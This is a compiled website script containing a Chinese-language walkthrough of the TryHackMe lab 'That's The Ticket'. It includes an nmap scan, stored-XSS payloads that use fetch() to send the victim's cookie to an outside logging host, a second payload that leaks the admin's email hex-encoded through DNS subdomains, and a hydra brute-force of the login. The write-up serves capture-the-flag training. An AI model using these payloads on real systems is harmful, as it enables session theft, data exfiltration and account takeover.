"use strict";(self.webpackChunkguardian_jtz_github_io=self.webpackChunkguardian_jtz_github_io||[]).push([[9722],{36674:(e,t,n)=>{n.r(t),n.d(t,{assets:()=>o,contentTitle:()=>r,default:()=>d,frontMatter:()=>i,metadata:()=>c,toc:()=>h});var a=n(74848),s=n(28453);const i={sidebar_position:139,tags:["Easy","Linux","\u9493\u9c7c","XSS"],title:"That's The Ticket",description:"That's The Ticket",sidebar_label:"That's The Ticket",slug:"/tryhackme/139"},r="That's The Ticket",c={id:"box/TryHackMe/139",title:"That's The Ticket",description:"That's The Ticket",source:"@site/docs/box/TryHackMe/139.md",sourceDirName:"box/TryHackMe",slug:"/tryhackme/139",permalink:"/docs/tryhackme/139",draft:!1,unlisted:!1,tags:[{label:"Easy",permalink:"/docs/tags/easy"},{label:"Linux",permalink:"/docs/tags/linux"},{label:"\u9493\u9c7c",permalink:"/docs/tags/\u9493\u9c7c"},{label:"XSS",permalink:"/docs/tags/xss"}],version:"current",sidebarPosition:139,frontMatter:{sidebar_position:139,tags:["Easy","Linux","\u9493\u9c7c","XSS"],title:"That's The Ticket",description:"That's The Ticket",sidebar_label:"That's The Ticket",slug:"/tryhackme/139"},sidebar:"boxSidebar",previous:{title:"Templates",permalink:"/docs/tryhackme/138"},next:{title:"Brute",permalink:"/docs/tryhackme/140"}},o={},h=[{value:"\u7aef\u53e3\u626b\u63cf",id:"\u7aef\u53e3\u626b\u63cf",level:2},{value:"80",id:"80",level:2}];function l(e){const t={code:"code",h1:"h1",h2:"h2",img:"img",p:"p",pre:"pre",...(0,s.R)(),...e.components};return(0,a.jsxs)(a.Fragment,{children:[(0,a.jsx)(t.h1,{id:"thats-the-ticket",children:"That's The Ticket"}),"\n",(0,a.jsx)(t.h2,{id:"\u7aef\u53e3\u626b\u63cf",children:"\u7aef\u53e3\u626b\u63cf"}),"\n",(0,a.jsx)(t.pre,{children:(0,a.jsx)(t.code,{className:"language-bash",children:"root@ip-10-10-29-11:~/thatstheticket# nmap -sTCV -p- --min-rate 1000 10.10.82.52\n\nStarting Nmap 7.60 ( https://nmap.org ) at 2023-10-04 08:32 BST\nNmap scan report for thatstheticket.thm (10.10.82.52)\nHost is up (0.00041s latency).\nNot shown: 65533 closed ports\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   2048 bf:c3:9c:99:2c:c4:e2:d9:20:33:d1:3c:dc:01:48:d2 (RSA)\n|   256 08:20:c2:73:c7:c5:d7:a7:ef:02:09:11:fc:85:a8:e2 (ECDSA)\n|_  256 1f:51:68:2b:5e:99:57:4c:b7:40:15:05:74:d0:0d:9b (EdDSA)\n80/tcp open  http    nginx 1.14.0 (Ubuntu)\n|_http-server-header: nginx/1.14.0 (Ubuntu)\n|_http-title: Ticket Manager > Home\nMAC Address: 02:7B:71:0C:32:15 (Unknown)\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 9.14 seconds\n"})}),"\n",(0,a.jsx)(t.h2,{id:"80",children:"80"}),"\n",(0,a.jsx)(t.p,{children:"\u8bbf\u95ee 80 \u7ad9\u70b9\u8fdb\u884c\u76ee\u5f55\u626b\u63cf\u4ee5\u53ca\u641c\u7d22\u540e\u65e0\u679c, \u6211\u53d1\u73b0\u53ef\u4ee5\u6ce8\u518c\u4e00\u4e2a\u8d26\u53f7, \u6ce8\u518c\u4e00\u4e2a\u8d26\u53f7\u8fdb\u884c\u767b\u5f55\u4e4b\u540e, \u6211\u53d1\u73b0\u5176\u662f\u521b\u5efa Ticket , \u5e94\u8be5\u662f\u5229\u7528 XSS \u83b7\u53d6 Cookie \u7684\u64cd\u4f5c, \u6240\u4ee5\u6211\u8fdb\u884c\u7b80\u5355\u7684\u641c\u7d22\u540e\u53d1\u73b0\u4ea7\u751f XSS \u7684\u65b9\u5f0f"}),"\n",(0,a.jsx)(t.pre,{children:(0,a.jsx)(t.code,{className:"language-bash",children:"</textarea>\n</div>\n<script>alert('xss')<\/script>\n"})}),"\n",(0,a.jsx)(t.p,{children:(0,a.jsx)(t.img,{src:"https://github.com/Guardian-JTZ/Image/raw/main/img/2024/07/09/20240709-171515.png",alt:"image-20240709171514234"})}),"\n",(0,a.jsx)(t.p,{children:"\u5229\u7528\u9898\u76ee\u7ed9\u51fa\u7684\u5229\u7528\u5de5\u5177\u6211\u5728 10.10.10.100 \u521b\u5efa\u4e86\u4e00\u4e2a\u5b50\u57df\u6765\u8fdb\u884c\u76d1\u542c, \u5e76\u521b\u5efa\u5982\u4e0b\u7968\u636e"}),"\n",(0,a.jsx)(t.pre,{children:(0,a.jsx)(t.code,{className:"language-bash",children:"</textarea>\n<script>\nfetch('http://0a60cac2492597aefd651605b8593157.log.tryhackme.tech/?cookie=' + document.cookie)\n  .then(response => response.text())\n  .then(data => {\n    console.log(data);\n  })\n<\/script>\n"})}),"\n",(0,a.jsx)(t.p,{children:"\u4f46\u662f\u5176\u53d1\u9001\u7684\u8bf7\u6c42\u5e76\u6ca1\u6709\u6211\u4eec\u7684 Cookie (\u8fd9\u91cc\u5176\u5b9e\u662f\u6211\u4eec\u7684\u7528\u6237) \u67e5\u770b\u9898\u76ee\u540e\u610f\u8bc6\u5230\u6211\u4eec\u53ef\u80fd\u9700\u8981\u53bb\u83b7\u53d6\u7ba1\u7406\u5458\u7684\u90ae\u7bb1"}),"\n",(0,a.jsx)(t.p,{children:(0,a.jsx)(t.img,{src:"https://github.com/Guardian-JTZ/Image/raw/main/img/2024/07/09/20240709-171521.png",alt:"image-20240709171520018"})}),"\n",(0,a.jsx)(t.p,{children:"\u5728\u8fd9\u91cc\u6211\u6539\u8fdb\u4e86\u6211\u4eec\u7684 XSS \u8f6c\u4e3a\u83b7\u53d6\u90ae\u7bb1, \u540c\u65f6\u5728\u6b64\u6709\u4e2a\u7279\u6b8a\u4e4b\u5904\u6211\u4eec\u7684\u670d\u52a1\u7aef\u53ef\u80fd\u505a\u4e86\u67d0\u4e9b\u63aa\u65bd\u5bfc\u81f4\u6211\u4eec\u65e0\u6cd5\u901a\u8fc7 HTTP \u6765\u83b7\u53d6\u6211\u4eec\u7684\u7ba1\u7406\u5458\u90ae\u7bb1, \u4f46\u662f\u53ef\u4ee5\u901a\u8fc7 DNS \u6765\u83b7\u53d6"}),"\n",(0,a.jsx)(t.pre,{children:(0,a.jsx)(t.code,{className:"language-bash",children:"</textarea>\n<script>\nfunction stringToHex(str) {\n  var hexString = '';\n  for (var i = 0; i < str.length; i++) {\n    var hex = str.charCodeAt(i).toString(16);\n    hexString += hex;\n  }\n  return hexString;\n}\n\nfetch('http://' + stringToHex(document.getElementById('email').innerHTML) + '.e3d6772b2acb2799aeeb04350ceb5a68.log.tryhackme.tech')\n  .then(response => response.text())\n  .then(data => {\n    console.log(data);\n  })\n\n<\/script>\n"})}),"\n",(0,a.jsx)(t.p,{children:(0,a.jsx)(t.img,{src:"https://github.com/Guardian-JTZ/Image/raw/main/img/2024/07/09/20240709-171528.png",alt:"image-20240709171526759"})}),"\n",(0,a.jsx)(t.p,{children:"\u83b7\u53d6\u5230\u7ba1\u7406\u5458\u7684\u8d26\u53f7\u540e\u6211\u4eec\u4f7f\u7528\u5176\u8fdb\u884c\u66b4\u529b\u7834\u89e3"}),"\n",(0,a.jsx)(t.pre,{children:(0,a.jsx)(t.code,{className:"language-bash",children:'root@ip-10-10-29-11:~/thatstheticket# hydra -l adminaccount@itsupport.thm  -P `locate rockyou.txt` thatstheticket.thm http-post-form "/login:email=^USER^&password=^PASS^:Invalid email"\n......\n[80][http-post-form] host: thatstheticket.thm   login: adminaccount@itsupport.thm   password: 123123\n......\n'})}),"\n",(0,a.jsx)(t.p,{children:"\u83b7\u53d6\u5230\u5bc6\u7801\u4e4b\u540e\u8fdb\u884c\u767b\u5f55\u5373\u53ef"}),"\n",(0,a.jsx)(t.p,{children:(0,a.jsx)(t.img,{src:"https://github.com/Guardian-JTZ/Image/raw/main/img/2024/07/09/20240709-171534.png",alt:"image-20240709171532736"})})]})}function d(e={}){const{wrapper:t}={...(0,s.R)(),...e.components};return t?(0,a.jsx)(t,{...e,children:(0,a.jsx)(l,{...e})}):l(e)}},28453:(e,t,n)=>{n.d(t,{R:()=>r,x:()=>c});var a=n(96540);const s={},i=a.createContext(s);function r(e){const t=a.useContext(i);return a.useMemo((function(){return"function"==typeof e?e(t):{...t,...e}}),[t,e])}function c(e){let t;return t=e.disableParentContext?"function"==typeof e.components?e.components(s):e.components||s:r(e.components),a.createElement(i.Provider,{value:t},e.children)}}}]);